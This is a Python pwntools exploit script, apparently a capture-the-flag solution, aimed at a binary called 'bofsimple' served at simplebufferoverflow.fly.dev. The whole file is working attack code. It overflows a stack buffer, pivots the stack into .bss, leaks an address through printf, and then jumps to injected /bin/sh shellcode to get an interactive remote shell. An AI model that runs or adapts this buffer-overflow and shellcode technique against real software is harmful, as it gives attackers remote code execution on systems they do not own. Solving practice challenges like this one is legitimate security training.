#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./bofsimple --host simplebufferoverflow.fly.dev --port 5000
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./bofsimple')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.terminal = ["tmux", "splitw", "-h"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'simplebufferoverflow.fly.dev'
port = int(args.PORT or 5000)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b main
b *main+119
continue
continue
'''.format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

io = start()

shellcode = asm(shellcraft.sh())
pad = 0x20


payload = b"A" * pad
payload += p64(exe.bss(offset=0x100))  # pivot stack
payload += p64(0x00000000004011b8)  # printf
payload += shellcode

pause(2)
io.sendlineafter(b"Feed me: ", payload)

leak = u64(io.recv(6).ljust(8, b"\x00"))
log.info(f"{leak=:016x}")

payload = b"A" * (pad + 0x8)
payload += p64(leak + 0x3b8)
io.sendline(payload)

io.interactive()
